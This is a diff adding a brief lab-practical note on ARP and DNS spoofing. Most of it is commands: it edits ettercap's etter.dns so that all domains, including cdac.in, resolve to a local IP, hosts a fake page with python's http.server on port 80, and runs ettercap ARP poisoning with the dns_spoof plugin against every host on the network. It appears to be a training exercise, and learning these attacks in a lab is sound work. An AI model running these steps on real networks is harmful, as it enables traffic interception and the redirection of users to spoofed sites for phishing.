@@ -1,0 +1,22 @@
+ARP + DNS spoofing 
+In this practical using ARP and DNS we do following steps:
+1)we create one directory
+$ sudo mkdir hacker
+2)Go to that Directory
+$ cd hacker 
+3) create A record of DNS 
+$ sudo vim /etc/ettercap/etter.dns
+*    A    192.168.206.137 
+cdac.in    A    192.168.206.137 
+.cdac.in    A    192.168.206.137 
+4) Create an index.html file in that add any text
+$ sudo vim index.html 
+5) Check ant website is runnung on 80 port
+$ lsof -i:80    
+6) we host our index.html website 
+$ python3 -m http.server --bind 192.168.206.137 80
+7) After that just dns spoofing we used this command
+ $ sudo ettercap -TqM ARP /// /// -P dns_spoof
+ $ sudo ettercap -i eth0 -TqM ARP /// /// -P dns_spoof (Optional)
+8) Then check any domain is resolving our website or not
+ for eg:http://xyz.com
